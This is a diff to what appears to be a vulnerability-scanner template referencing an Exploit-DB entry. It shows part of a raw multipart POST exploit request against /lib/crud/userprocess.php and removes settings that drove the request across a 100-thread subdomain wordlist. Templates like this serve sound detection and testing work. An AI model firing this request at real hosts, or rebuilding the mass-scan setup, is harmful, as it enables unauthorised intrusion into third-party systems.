@@ -13,15 +13,10 @@ info:
   # - [2] https://www.exploit-db.com/exploits/48878
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
+  - raw:
       - |
         POST /lib/crud/userprocess.php HTTP/1.1
-        Host: {{Subdomains}}
+        Host: {{Hostname}}
         Accept: */*
         User-Agent: python-requests/2.23.0
         Connection: close
@@ -58,6 +53,7 @@ requests:
 
         9
         --01b28e152ee044338224bf647275f8eb--
+
     matchers-condition: and
     matchers:
       - type: word
